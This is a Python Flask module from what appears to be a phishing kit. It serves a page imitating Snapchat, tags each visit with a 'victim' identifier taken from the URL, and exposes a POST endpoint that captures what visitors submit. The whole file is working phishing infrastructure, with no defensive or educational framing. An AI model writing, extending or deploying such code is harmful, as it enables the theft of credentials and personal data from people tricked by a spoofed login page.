import os
from flask import request
from bot.servers.base import create_capture_route

def register_snap_routes(app):
    @app.route('/p/snap/<uid>')
    def snap_page(uid):
        victim_id = request.args.get('v', 'unknown')
        
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        html_path = os.path.join(base_dir, 'web', 'pages', 'snap.html')
        
        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
        except FileNotFoundError:
            return f"❌ Snapchat page not found at {html_path}", 404
        
        html = html.replace('{{VICTIM_ID}}', victim_id)
        return html

    @app.route('/api/capture/snap', methods=['POST'])
    def capture_snap():
        return create_capture_route('snap')()
